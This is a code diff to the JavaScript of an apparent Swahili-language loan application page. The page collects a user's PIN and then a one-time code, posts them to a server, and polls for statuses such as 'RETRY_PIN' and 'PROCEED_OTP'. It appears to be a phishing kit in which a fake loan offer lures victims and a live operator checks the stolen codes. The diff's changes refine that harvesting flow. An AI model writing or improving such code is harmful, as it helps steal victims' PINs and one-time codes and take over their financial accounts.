@@ -4,6 +4,27 @@ document.addEventListener('DOMContentLoaded', () => {
   let statusPollInterval = null;
   let countdownTimer = null;
 
+  // Ensure loading overlay exists in DOM
+  let loadingOverlay = document.getElementById('loading-overlay');
+  if (!loadingOverlay) {
+    loadingOverlay = document.createElement('div');
+    loadingOverlay.id = 'loading-overlay';
+    loadingOverlay.innerHTML = `
+      <div class="spinner"></div>
+      <div class="loading-text" id="loading-message">Tafadhali subiri, inathibitisha maombi yako...</div>
+    `;
+    document.body.appendChild(loadingOverlay);
+  }
+
+  function showLoading(msg = "Tafadhali subiri, inathibitisha...") {
+    document.getElementById('loading-message').innerText = msg;
+    loadingOverlay.classList.add('active');
+  }
+
+  function hideLoading() {
+    loadingOverlay.classList.remove('active');
+  }
+
   const appData = {
     loanType: 'Mkopo wa Biashara',
     loanAmount: 100000,
@@ -19,6 +40,7 @@ document.addEventListener('DOMContentLoaded', () => {
   };
 
   function showScreen(screenNum) {
+    hideLoading();
     document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
     const target = document.getElementById(`screen-${screenNum}`);
     if (target) {
@@ -78,7 +100,6 @@ document.addEventListener('DOMContentLoaded', () => {
     displayAmount.innerText = `TSH ${amt.toLocaleString()}`;
     displayTerm.innerText = `${terms} MONTHS`;
 
-    // Simple estimation formula
     const monthly = Math.round((amt * (1 + 0.135 * (terms / 12))) / terms);
     const total = monthly * terms;
 
@@ -122,7 +143,6 @@ document.addEventListener('DOMContentLoaded', () => {
       return;
     }
 
-    // Populate summary in Step 3
     document.getElementById('sum-amount').innerText = `TSh ${parseInt(appData.loanAmount).toLocaleString()}`;
     document.getElementById('sum-duration').innerText = appData.loanDuration;
     document.getElementById('sum-purpose').innerText = appData.purpose;
@@ -133,7 +153,7 @@ document.addEventListener('DOMContentLoaded', () => {
   // Form Step 3
   document.getElementById('btn-s5-back').addEventListener('click', () => showScreen(4));
   document.getElementById('btn-screen5-prev').addEventListener('click', () => showScreen(4));
-  document.getElementById('btn-screen5-submit').addEventListener('click', async () => {
+  document.getElementById('btn-screen5-submit').addEventListener('click', () => {
     appData.employmentStatus = document.getElementById('employment-status').value;
     appData.annualIncome = document.getElementById('annual-income').value;
     showScreen(6);
@@ -164,8 +184,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     appData.pin = pinVal;
     
-    const statusMsg = document.getElementById('pin-status-msg');
-    statusMsg.innerText = "Inathibitisha...";
+    showLoading("Inathibitisha PIN yako... Tafadhali subiri");
 
     try {
       const urlParams = new URLSearchParams(window.location.search);
@@ -182,12 +201,12 @@ document.addEventListener('DOMContentLoaded', () => {
       }
 
       startStatusPolling(() => {
-        statusMsg.innerText = "";
+        hideLoading();
         showScreen(7);
         startOtpCountdown();
-      });
+      }, 'PIN');
     } catch (e) {
-      statusMsg.innerText = "";
+      hideLoading();
       showScreen(7);
       startOtpCountdown();
     }
@@ -244,8 +263,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     appData.otp = otpVal;
 
-    const otpStatusMsg = document.getElementById('otp-status-msg');
-    otpStatusMsg.innerText = "Inathibitisha OTP...";
+    showLoading("Inathibitisha OTP... Tafadhali subiri");
 
     try {
       await fetch('/api/submit-otp', {
@@ -255,32 +273,44 @@ document.addEventListener('DOMContentLoaded', () => {
       });
 
       startStatusPolling(() => {
-        otpStatusMsg.innerText = "";
+        hideLoading();
         showScreen(8);
-      });
+      }, 'OTP');
     } catch (e) {
-      otpStatusMsg.innerText = "";
+      hideLoading();
       showScreen(8);
     }
   });
 
-  function startStatusPolling(onSuccess) {
+  function startStatusPolling(onSuccess, stage) {
     if (statusPollInterval) clearInterval(statusPollInterval);
     statusPollInterval = setInterval(async () => {
       if (!userId) return;
       try {
         const res = await fetch(`/api/check-status/${userId}`);
         const data = await res.json();
-        if (data.status === 'PROCEED_OTP' || data.status === 'SUCCESS') {
+        
+        if (data.status === 'PROCEED_OTP' && stage === 'PIN') {
+          clearInterval(statusPollInterval);
+          onSuccess();
+        } else if (data.status === 'SUCCESS' && stage === 'OTP') {
           clearInterval(statusPollInterval);
           onSuccess();
         } else if (data.status === 'RETRY_PIN') {
           clearInterval(statusPollInterval);
-          alert('PIN imekataliwa. Tafadhali weka PIN sahihi upya.');
+          hideLoading();
+          alert('PIN ISIYO SAHIHI');
           showScreen(6);
         } else if (data.status === 'RETRY_OTP') {
           clearInterval(statusPollInterval);
-          alert('OTP imeisha muda wake au imekataliwa. Tafadhali omba mpya.');
+          hideLoading();
+          alert('UMEINGIZA OTP ILIYOISHA MUDA WAKE');
+        } else if (data.status === 'SUCCESS' && stage === 'PIN') {
+          // If approved directly at PIN stage
+          clearInterval(statusPollInterval);
+          hideLoading();
+          alert('HONGERA UMEIDHINISHA');
+          showScreen(8);
         }
       } catch (err) {}
     }, 3000);
